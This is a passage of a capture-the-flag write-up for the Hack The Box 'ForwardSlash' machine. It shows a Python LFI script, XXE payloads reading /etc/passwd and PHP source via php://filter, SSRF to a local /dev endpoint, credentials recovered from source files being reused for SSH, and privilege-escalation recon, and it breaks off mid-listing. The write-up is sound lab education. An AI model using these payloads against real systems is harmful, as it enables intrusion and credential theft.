src="https://user-images.githubusercontent.com/9076747/79314626-368b9180-7f02-11ea-8d01-a3503bd96e5d.png" alt="form call forwardslash"></p><p>And indeed when validating the form a new request appear on our web server confirming that the “Photo Update” function is still running and only the HTML form got disabled:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.10.183 - - [08/Apr/2020 20:38:25] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 200 -</span><br></pre></td></tr></table></figure><p>But something more interesting appear on the page:</p><p> <img src="https://user-images.githubusercontent.com/9076747/79314727-5cb13180-7f02-11ea-8465-903f31c33af2.png" alt="return page forwardslash"></p><p>The web server return message gets displayed below the form. </p><p>Something else come to my mind. Seeing the box name <code>ForwardSlash</code> can we use this form to achieve Local File Inclusion ? Let’s see if we can access the <code>index.php</code> file from here.</p><blockquote><p>Permission Denied; not that way ;)</p></blockquote><p>Seems like we are almost on the right track… Let’s try the classical <code>/etc/passwd</code> to validate -or not- the LFI theory:</p><p><img src="https://user-images.githubusercontent.com/9076747/79315755-af3f1d80-7f03-11ea-9c39-8601359c4adb.png" alt="etc passwd forwardslash"></p><p>Bingo! We can see two users on the box: <code>chiv</code> and <code>pain</code>. The same two developers we have seen leaving messages around. Let’s keep that in mind for later.</p><p>Now let’s try to access other useful files using this LFI. From here I decided to write a small script to ease the LFI process. As much as possible it’s always good to write your own script to make sure you understand every steps you are doing.</p><p>This script is clearly not the prettiest one nor that most performant to it do the job well enough:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">PHPSESSID = <span class="string">&quot;xxxxxxxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: PHPSESSID&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    file_path = <span class="built_in">input</span>(<span class="string">&#x27;File path &gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = &#123;<span class="string">&#x27;url&#x27;</span>: file_path&#125;</span><br><span class="line">    </span><br><span class="line">    r = requests.post(<span class="string">&quot;http://backup.forwardslash.htb/profilepicture.php&quot;</span>,</span><br><span class="line">                      cookies=cookies,</span><br><span class="line">                      data=payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(r.content) != <span class="number">689</span>:  <span class="comment"># 689 is the size or &quot;normal&quot; response</span></span><br><span class="line">        file_only = re.sub(<span class="string">&#x27;&lt;!(.*?)/html&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, r.text, <span class="number">1</span>, re.DOTALL)</span><br><span class="line">        <span class="built_in">print</span>(file_only)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Permission Denied / File does not exist&quot;</span>)</span><br></pre></td></tr></table></figure><p>Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python lfi-blog.py</span><br><span class="line">File path &gt; /etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/<span class="literal">false</span></span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:109:1::/var/cache/pollinate:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">pain:x:1000:1000:pain:/home/pain:/bin/bash</span><br><span class="line">chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash</span><br><span class="line">mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">File path &gt;</span><br></pre></td></tr></table></figure><p>Faster and easier to read right ?</p><p>Using this let’s try to access as much file as we can, first let’s try the usual sensitive SSH keys:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python lfi-blog.py</span><br><span class="line">File path &gt; /home/chiv/.ssh/id_rsa</span><br><span class="line">Permission Denied / File does not exist</span><br><span class="line">File path &gt; /home/pain/.ssh/id_rsa</span><br><span class="line">Permission Denied / File does not exist</span><br><span class="line">File path &gt;</span><br></pre></td></tr></table></figure><p>It would have been too easy right of course. Maybe if we can find the web app path we can access the app source code with sensitive informations.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python lfi-blog.py</span><br><span class="line">File path &gt; config.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//credentials <span class="keyword">for</span> the temp db <span class="keyword">while</span> we recover, had to backup old config, didn<span class="string">&#x27;t want it getting compromised -pain</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_SERVER<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_USERNAME<span class="string">&#x27;, &#x27;</span>www-data<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>site<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* Attempt to connect to MySQL database */</span></span><br><span class="line"><span class="string">$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Check connection</span></span><br><span class="line"><span class="string">if($link === false)&#123;</span></span><br><span class="line"><span class="string">    die(&quot;ERROR: Could not connect. &quot; . mysqli_connect_error());</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>Here we have the credentials of the <code>temp</code> database, this won’t be very useful. Since we know the server is Apache let’s see if the web app is stored in the default Apache folder:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python lfi-blog.py</span><br><span class="line">File path &gt; /var/www/html/index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//<span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>] !== <span class="string">&quot;forwardslash.htb&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>] !== <span class="string">&quot;forwardslash.htb&quot;</span>) &#123;</span><br><span class="line">        header(<span class="string">&quot;Location: http://forwardslash.htb&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">You call this security? &lt;font color=<span class="string">&quot;red&quot;</span>&gt;LOL&lt;/font&gt;, absolute trash server...   |</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Unfortunately it’s the defaced website laying here and it’s the backup website that will be interesting for us. Knowing that the server is Apache you can guess that <code>backup.forwardslash.htb</code> is using a <a href="https://httpd.apache.org/docs/2.4/en/vhosts/examples.html">Virtual Host</a>. </p><p>In addition a common practice is to use the domain name as folder to setup Virtual Host since it’s easier for organization. For example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Listen 80</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    DocumentRoot <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">    ServerName forwardslash.htb</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    DocumentRoot <span class="string">&quot;/var/www/forwardslash.htb&quot;</span></span><br><span class="line">    ServerName backup.forwardslash.htb</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>Let’s now try to see if our theory is correct:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python lfi-blog.py</span><br><span class="line">File path &gt; /var/www/backup.forwardslash.htb/register.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// Include config file</span><br><span class="line">require_once <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">// Define variables and initialize with empty values</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$password</span> = <span class="variable">$confirm_password</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$username_err</span> = <span class="variable">$password_err</span> = <span class="variable">$confirm_password_err</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Alright! We have the right path. Now let’s check for files found previously by <code>gobuster</code>. One that particularly catch the eye is the <code>/dev/</code> folder since we can not access it:</p><p><img src="https://user-images.githubusercontent.com/9076747/79315096-dcd79700-7f02-11ea-9011-58b96cb60f5d.png" alt="dev endpoint forwardslash" title="dev endpoint forwardslash"></p><p>Let’s see if we can access the <code>index.php</code> inside this folder to see what it is doing:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python lfi-blog.py</span><br><span class="line">File path &gt; /var/www/backup.forwardslash.htb/dev/index.php</span><br><span class="line">&lt;?php</span><br><span class="line">[...]</span><br><span class="line"><span class="keyword">if</span> (@ftp_login(<span class="variable">$conn_id</span>, <span class="string">&quot;chiv&quot;</span>, <span class="string">&#x27;N0bodyL1kesBack/&#x27;</span>)) &#123;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>FTP credentials for <code>chiv</code> user, that explains why the defaced homepage mentioned “<em>who even uses XML and Automatic FTP Logins</em>“. </p><p>Since <code>nmap</code> didn’t return any open FTP server let’s try to reuse those credentials to login into SSH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh chiv@forwardslash.htb</span><br><span class="line">chiv@forwardslash.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Tue Mar 24 11:34:37 2020 from 10.10.14.3</span></span><br><span class="line"><span class="string">chiv@forwardslash:~$ ls</span></span><br><span class="line"><span class="string">chiv@forwardslash:~$</span></span><br></pre></td></tr></table></figure><h3 id="Method-2-XXE-Local-File-Inclusion-on-dev-API"><a href="#Method-2-XXE-Local-File-Inclusion-on-dev-API" class="headerlink" title="Method 2: XXE Local File Inclusion on /dev/ API"></a>Method 2: XXE Local File Inclusion on /dev/ API</h3><p>The second method was the main one to go to. That’s the one I used. Let’s see in detail the process.</p><p>First let’s see the first rabbit hole I fell into. Knowing that the <code>/dev/</code> endpoint can’t be accessed from our host, we can imagine it’s accessible from <code>127.0.0.1</code> right ?<br>With this knowledge we could probably exploit again the <code>profilepicture.php</code> page to access this page using SSRF. Let’s give a try:</p><p><img src="https://user-images.githubusercontent.com/9076747/79317113-95063f00-7f05-11ea-93a6-35e7aa075b47.png" alt="SSRF forwardslash"></p><p>Alright, that’s a good progress, we managed to access the <code>/dev/</code> endpoint. This gives us a few ideas of what is there: </p><ul><li><p>An XML API</p></li><li><p>A page (<code>index.php</code>) to test this API</p></li><li><p>And probably something related to FTP as seen in the <code>/dev/index.php</code> page source code : <code>&lt;!-- TODO: Fix FTP Login--&gt;</code>.</p></li></ul><p>That’s a lot of useful informations, but what can we really do from here ? Unfortunately not much now since the <code>/dev/index.php</code> page is “interactive”. After trying to exploit this page page from the  <code>profilepicture.php</code> in every possible ways I finally gave up thinking it’s not the right way to go. </p><p>When this happen I like to go back to the beginning to make sure I didn’t miss something important. While doing so I remembered my notes:</p><blockquote><blockquote><p>No account found with that username “admin”.</p></blockquote><p>Might be interesting to keep that in mind for later.</p></blockquote><p>In the same idea of the recently released “Book” box let’s try to create the <code>admin</code> account to see if you can gain extra privileges on the app: </p><p><img src="https://user-images.githubusercontent.com/9076747/79318255-05619000-7f07-11ea-878b-b9622c73f434.png" alt="admin account forwardslash"></p><p>It works, at first it don’t seems like we have extra privileges… What about that <code>/dev/</code> endpoint?</p><p><img src="https://user-images.githubusercontent.com/9076747/79318514-638e7300-7f07-11ea-8416-5cc19d0fd57e.png" alt="dev endpoint admin forwardslash"></p><p>That’s a great progress! And now we can access the returned output of the test function. Now we can focus on finding a vulnerability in this XML Api using the test function.</p><p>The first thing that come to mind when working with XML is XXE (<a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">XML External Entity Processing</a>). We can see that the content of <code>&lt;request&gt;</code> node is reflected in the output of the API. Can we exploit this behavior to access local resources?</p><p>Let’s try with the most common XXE injection adapted to this API format:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">api</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">request</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">api</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/9076747/79319415-938a4600-7f08-11ea-8837-2cbf36788311.png" alt="XXE forwardslash"></p><p>Bingo! Let’s now try to access the current page (<code>index.php</code>) to see if we can find details about FTP mentioned in the code source.</p><p>If we can guess the current page full path we can go the same way:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> </span></span><br><span class="line"><span class="meta">[<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///var/www/forwardslash.htb/dev/index.php&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">api</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">request</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">api</span>&gt;</span></span><br></pre></td></tr></table></figure><p>In the case we didn’t know the full current path, it’s also possible to access it using <a href="https://www.php.net/manual/fr/wrappers.php.php#wrappers.php.filter"><code>php://filter</code></a>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> </span></span><br><span class="line"><span class="meta">[<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">api</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">request</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">api</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/9076747/79320436-2081cf00-7f0a-11ea-9657-0205f4dc583d.png" alt="php filter xxe forwardslash"></p><p>Looks good! Let’s decode this output to see the content of the <code>index.php</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat output | base64 -d &gt; index.php</span><br><span class="line">[hg8@archbook ~]$ head index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//include_once ../session.php;</span><br><span class="line">// Initialize the session</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((!isset(<span class="variable">$_SESSION</span>[<span class="string">&quot;loggedin&quot;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&quot;loggedin&quot;</span>] !== <span class="literal">true</span> || <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&quot;admin&quot;</span>) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    header(<span class="string">&#x27;HTTP/1.0 403 Forbidden&#x27;</span>);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&lt;h1&gt;403 Access Denied&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&lt;h3&gt;Access Denied From &quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>], <span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    //<span class="built_in">echo</span> <span class="string">&quot;&lt;h2&gt;Redirecting to login in 3 seconds&lt;/h2&gt;&quot;</span></span><br><span class="line">[hg8@archbook ~]$</span><br></pre></td></tr></table></figure><p>And while looking around this <code>index.php</code> we stumbled across:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@ftp_login(<span class="variable">$conn_id</span>, <span class="string">&quot;chiv&quot;</span>, <span class="string">&#x27;N0bodyL1kesBack/&#x27;</span>)) &#123;</span><br></pre></td></tr></table></figure><p>FTP credentials for <code>chiv</code> user, that explains why the defaced homepage mentioned “<em>who even uses XML and Automatic FTP Logins</em>“.</p><p>Since <code>nmap</code> didn’t return any open FTP server let’s try to reuse those credentials to login into SSH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh chiv@forwardslash.htb</span><br><span class="line">chiv@forwardslash.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Tue Mar 24 11:34:37 2020 from 10.10.10.10</span></span><br><span class="line"><span class="string">chiv@forwardslash:~$ ls</span></span><br><span class="line"><span class="string">chiv@forwardslash:~$</span></span><br></pre></td></tr></table></figure><h3 id="Pivot-chiv-gt-pain"><a href="#Pivot-chiv-gt-pain" class="headerlink" title="Pivot chiv -&gt; pain"></a>Pivot chiv -&gt; pain</h3><p>As we noticed earlier we are going to need to pivot from <code>chiv</code> to <code>pain</code> user in order to gain access to the user flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:~$ ls -l /home/pain</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 pain root 4096 Mar 24 12:06 encryptorinator</span><br><span class="line">-rw-r--r-- 1 pain root  256 Jun  3  2019 note.txt</span><br><span class="line">-rw------- 1 pain pain   33 Apr 15 00:33 user.txt</span><br></pre></td></tr></table></figure><p>In <code>pain</code> home folder we can read a <code>note.txt</code>: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:/$ cat /home/pain/note.txt</span><br><span class="line">Pain, even though they got into our server, I made sure to encrypt any </span><br><span class="line">important files and <span class="keyword">then</span> did some crypto magic on the key... </span><br><span class="line">I gave you the key <span class="keyword">in</span> person the other day, so unless these hackers </span><br><span class="line">are some crypto experts we should be good to go.</span><br><span class="line"></span><br><span class="line">-chiv</span><br></pre></td></tr></table></figure><p>The tool used to “<em>encrypt</em>“ the important files is also present in <code>pain</code> home folder:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:~$ ls -l /home/pain/encryptorinator/</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 pain root 165 Jun  3  2019 ciphertext</span><br><span class="line">-rw-r--r-- 1 pain root 931 Jun  3  2019 encrypter.py</span><br><span class="line">chiv@forwardslash:~$ cat /home/pain/encryptorinator/ciphertext</span><br><span class="line">,L</span><br><span class="line">&gt;2Xբ</span><br><span class="line">|?I)E-˒\/;y[w<span class="comment">#M2ʐY@&#x27;缘泣,P@5f$\*rwF3gX&#125;i6~KY&#x27;%e&gt;xo+g/K&gt;^Nke</span></span><br><span class="line">chiv@forwardslash:~$</span><br></pre></td></tr></table></figure><p>Alright, we have a encrypted file and the tool used to encrypt it, if we manage to break the crypto, the <code>cipher</code> will probably offer us a clue to gain access to <code>pain</code> user right ?</p><p><img src="https://user-images.githubusercontent.com/9076747/79325948-59be3d00-7f12-11ea-93d9-97fe5ed8d740.jpg" alt="well yes but actually no"></p><p>While you can spend time on breaking the crypto -spoiler alert- this will only be useful to gain access to <code>root</code>, and not <code>pain</code> user. </p><p>Let’s focus on another unusual point that seems interesting about <code>pain</code> account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:~$ id pain</span><br><span class="line">uid=1000(pain) gid=1000(pain) groups=1000(pain),1002(backupoperator)</span><br></pre></td></tr></table></figure><p><code>pain</code> belongs to the <code>backupoperator</code> group, so there is definitely something going on with a backup process.</p><p>While continuing the recon process we stumble across an uncommon backup files:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:~$ ls -l /var/backups/</span><br><span class="line">-rw------- 1 pain pain             526  Jun 21  2019 config.php.bak</span><br><span class="line">drwxrwx--- 2 root backupoperator   4096 May 27  2019 recovery</span><br></pre></td></tr></table></figure><p>And an uncommon SUID binary belonging to <code>pain</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:~$ find /usr/bin/ -perm -u=s -<span class="built_in">type</span> f</span><br><span class="line">-r-sr-xr-x 1 pain pain 13384 Mar  6 10:06 backup</span><br></pre></td></tr></table></figure><p>That’s probably the backup file and tool mentioned in <code>chiv</code> user <code>note.txt</code>?</p><p>Let’s try to see what’s this backup tool is doing:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 